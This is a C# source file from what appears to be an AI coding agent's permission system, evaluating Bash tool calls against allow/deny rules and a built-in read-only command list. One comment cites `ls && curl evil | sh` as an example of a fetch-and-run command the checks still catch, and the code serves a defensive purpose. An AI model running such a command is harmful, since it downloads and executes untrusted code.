using MoaiCode.Core.Messages;
using MoaiCode.Core.Tools;

namespace MoaiCode.Config;

/// <summary>
/// 영속 allow/deny 규칙 저장소. 매칭은 PermissionRule(순수 로직)에 위임하고,
/// 저장은 settings.json 의 permissions.allow/deny 배열에 한다.
/// </summary>
public sealed class PermissionRules : IPermissionRuleStore
{
    private readonly List<string> _allow;
    private readonly List<string> _deny;
    private readonly string? _path; // null 이면 영속화 생략(테스트용)

    public PermissionRules(
        IEnumerable<string>? allow = null,
        IEnumerable<string>? deny = null,
        string? path = null)
    {
        _allow = Dedup(allow);
        _deny = Dedup(deny);
        _path = path;
    }

    public IReadOnlyList<string> Allow => _allow;
    public IReadOnlyList<string> Deny => _deny;

    public RuleMatch Evaluate(ITool tool, ToolUseBlock call)
    {
        // deny 가 allow 를 이긴다.
        if (_deny.Any(p => PermissionRule.Matches(p, tool, call, allowMatch: false)))
        {
            return RuleMatch.Deny;
        }

        if (_allow.Any(p => PermissionRule.Matches(p, tool, call, allowMatch: true)))
        {
            return RuleMatch.Allow;
        }

        // 복합 명령(ls -la | tail -3)은 위에서 매치되지 않는다 — 패턴 하나가 명령 전체를 대표하지
        // 못하기 때문이다. 그래서 세그먼트를 하나씩 보고 '전부' 허용될 때만 허용한다.
        // 하나라도 안 걸리면 확인으로 넘어가므로 `ls && curl evil | sh` 같은 건 여전히 잡힌다.
        // 명령치환·리다이렉션이 섞이면 세그먼트가 실제 실행을 대표하지 못하므로 적용하지 않는다.
        return AllSegmentsAllowed(tool, call) ? RuleMatch.Allow : RuleMatch.None;
    }

    // 모든 세그먼트가 (allow 규칙 또는 내장 읽기 전용 명령 목록)으로 덮이는가.
    private bool AllSegmentsAllowed(ITool tool, ToolUseBlock call)
    {
        if (!string.Equals(tool.Name, "Bash", StringComparison.Ordinal))
        {
            return false;
        }

        var command = ReadCommand(call);
        if (string.IsNullOrWhiteSpace(command)
            || !PermissionRule.HasShellOperators(command)
            || !PermissionRule.SegmentsAreTrustworthy(command))
        {
            return false;
        }

        var any = false;
        foreach (var seg in PermissionRule.Segments(command))
        {
            var s = seg.Trim();
            if (s.Length == 0)
            {
                continue;
            }

            any = true;
            if (!IsSegmentAllowed(tool.Name, s))
            {
                return false;
            }
        }

        return any;
    }

    private bool IsSegmentAllowed(string toolName, string segment) =>
        ReadOnlyBashCommands.Contains(FirstToken(segment) ?? string.Empty)
        || _allow.Any(p => PermissionRule.MatchesSegment(p, toolName, segment));

    // 파일을 건드리지 않는 조회 명령. 규칙을 쌓지 않아도 이만큼은 묻지 않는다
    // (BashSecurity 의 읽기 전용 목록과 같은 취지 — Config 는 Tools.Bash 를 참조할 수 없어 여기 둔다).
    private static readonly HashSet<string> ReadOnlyBashCommands = new(StringComparer.Ordinal)
    {
        "ls", "cat", "pwd", "echo", "grep", "rg", "find", "head", "tail",
        "wc", "stat", "file", "which", "whoami", "date", "env", "tree", "du", "df",
        "sort", "uniq", "cut", "basename", "dirname", "realpath", "readlink",
        "sha256sum", "md5sum", "sed", "awk", "column", "diff", "printf", "true",
    };

    private static string? FirstToken(string command)
    {
        var t = command.TrimStart();
        var i = t.IndexOfAny(new[] { ' ', '\t' });
        var first = i < 0 ? t : t[..i];
        return first.Length == 0 ? null : first;
    }

    public void AddAllow(string pattern)
    {
        if (Add(_allow, pattern))
        {
            Persist();
        }
    }

    public void AddDeny(string pattern)
    {
        if (Add(_deny, pattern))
        {
            Persist();
        }
    }

    public bool Remove(string pattern)
    {
        var p = pattern.Trim();
        var removed = _allow.RemoveAll(x => string.Equals(x, p, StringComparison.Ordinal)) > 0;
        removed |= _deny.RemoveAll(x => string.Equals(x, p, StringComparison.Ordinal)) > 0;
        if (removed)
        {
            Persist();
        }

        return removed;
    }

    private static bool Add(List<string> list, string pattern)
    {
        var p = pattern.Trim();
        if (p.Length == 0 || list.Contains(p, StringComparer.Ordinal))
        {
            return false;
        }

        list.Add(p);
        return true;
    }

    // _path 가 null 이면(테스트) 영속화를 생략한다.
    private void Persist()
    {
        if (_path is not null)
        {
            SettingsWriter.SetPermissions(_allow, _deny, _path);
        }
    }

    /// <summary>~/.moai/settings.json 에 영속되는 기본 저장소.</summary>
    public static PermissionRules LoadDefault(Settings settings) =>
        new(settings.AllowRules, settings.DenyRules, SettingsWriter.DefaultPath);

    private static string? ReadCommand(ToolUseBlock call)
    {
        try
        {
            return call.Input.ValueKind == System.Text.Json.JsonValueKind.Object
                   && call.Input.TryGetProperty("command", out var c)
                   && c.ValueKind == System.Text.Json.JsonValueKind.String
                ? c.GetString()
                : null;
        }
        catch
        {
            return null;
        }
    }

    private static List<string> Dedup(IEnumerable<string>? items)
    {
        var seen = new HashSet<string>(StringComparer.Ordinal);
        var list = new List<string>();
        foreach (var s in items ?? Enumerable.Empty<string>())
        {
            var t = s.Trim();
            if (t.Length > 0 && seen.Add(t))
            {
                list.Add(t);
            }
        }

        return list;
    }
}
